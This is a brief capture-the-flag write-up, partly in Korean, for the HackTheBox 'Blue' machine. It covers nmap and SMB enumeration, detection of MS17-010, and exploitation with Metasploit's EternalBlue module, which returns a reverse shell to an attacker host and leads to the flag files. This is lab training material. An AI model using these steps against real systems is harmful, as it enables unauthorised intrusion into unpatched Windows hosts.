# Blue - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,445 -sC -sV -vv -oA blue 10.10.10.40
```
<img width="1103" height="139" alt="image" src="https://github.com/user-attachments/assets/3e73ead7-8e7e-426e-b9ca-bccdc0c394d9" />

---
## SMB
- `guest`로그인으로 `Share, Users`폴더를 탐색할 수 있으나, 내부에서특별한 파일들을 찾지 못함.
```bash
smbmap -u ‘’ -p ‘’ -H 10.10.10.40
```
<img width="1103" height="173" alt="image" src="https://github.com/user-attachments/assets/4ff04976-b330-4abe-b167-7607a6325c7d" />

<br>
<br>

- `nmap`에서 `vuln`스크립트를 사용해봄.
- `MS17-010`취약점 발견.
```bash
sudo nmap -p 135,139,445 -sC -sV --script=vuln 10.10.10.40
```
<img width="1103" height="341" alt="image" src="https://github.com/user-attachments/assets/7dfb03d2-39cd-4a35-886a-07b3a297053a" />

---
## EternalBlue(MS17-010)
- `metasploit`의 `ms17_010_eternalblue`모듈을 사용해서 exploit 시도.
```
set rhosts 10.10.10.40

set lhost 10.10.16.3

run
```
<img width="1103" height="182" alt="image" src="https://github.com/user-attachments/assets/1b6375e7-c578-4193-bfb8-d9c2a3a50006" />

<br>
<br>

```
shell
```
<img width="1103" height="182" alt="image" src="https://github.com/user-attachments/assets/0d507fd4-d460-44b8-8d2e-b36f5a531939" />

---
## FLAG
- `c:\users\haris\desktop\user.txt`
<img width="1103" height="250" alt="image" src="https://github.com/user-attachments/assets/f0f0700c-a580-4931-8631-58c2401b4fb9" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1103" height="250" alt="image" src="https://github.com/user-attachments/assets/c77c85ca-b87c-4384-af96-322a6ec079c9" />




